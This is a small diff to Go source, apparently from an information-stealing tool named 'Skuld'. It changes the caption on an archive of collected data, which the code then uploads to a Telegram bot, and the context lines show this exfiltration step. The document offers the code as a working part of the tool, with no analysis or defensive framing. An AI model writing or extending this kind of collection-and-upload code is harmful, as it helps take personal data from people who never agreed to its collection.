@@ -81,8 +81,12 @@ func (dc *DataCollector) SendCollectedData() error {
 		return fmt.Errorf("failed to create archive: %v", err)
 	}
 
+	// Get file size for caption
+	fileInfo, _ := os.Stat(archivePath)
+	fileSizeMB := float64(fileInfo.Size()) / (1024 * 1024)
+
 	// Send archive via Telegram
-	caption := "🔍 Skuld Data Collection Complete\n📦 Collected data archive"
+	caption := fmt.Sprintf("🔍 Skuld Data Collection Complete\n📦 Archive Size: %.2f MB\n🎯 All modules executed successfully", fileSizeMB)
 	if err := dc.TelegramBot.SendDocument(archivePath, caption); err != nil {
 		// Clean up and return error
 		os.Remove(archivePath)
